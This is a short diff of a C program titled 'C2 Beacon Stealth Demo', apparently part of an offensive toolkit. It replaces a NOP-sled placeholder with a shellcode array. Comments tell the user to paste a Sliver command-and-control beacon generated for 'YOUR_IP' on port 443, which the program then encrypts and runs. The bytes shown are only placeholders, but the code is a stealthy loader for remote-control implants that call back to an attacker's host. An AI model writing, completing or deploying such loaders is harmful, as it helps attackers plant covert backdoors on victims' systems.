@@ -284,9 +284,18 @@ PVOID ExampleC2Callback(PVOID pArg) {
 int main() {
     printf("=== C2 Beacon Stealth Demo ===\n\n");
 
-    // Example beacon code (in production, this would be actual implant code)
-    BYTE beaconCode[4096] = {0x90};  // NOP sled for testing
-    SIZE_T beaconSize = sizeof(beaconCode);
+    // ============================================================================
+    // SHELLCODE_PLACEHOLDER - Replace with your C2 beacon from noctis_generate_beacon()
+    // ============================================================================
+    // Generated with: noctis_generate_beacon("sliver", "YOUR_IP", 443, "x64", "shellcode")
+    // Example format:
+    unsigned char shellcode[] = {
+        0x90, 0x90, 0x90  // <-- REPLACE THIS with bytes from generated shellcode
+        // Paste your shellcode bytes here (format: 0xXX, 0xXX, 0xXX, ...)
+    };
+
+    BYTE *beaconCode = shellcode;
+    SIZE_T beaconSize = sizeof(shellcode);
 
     // Generate encryption key
     BYTE encryptionKey[32];
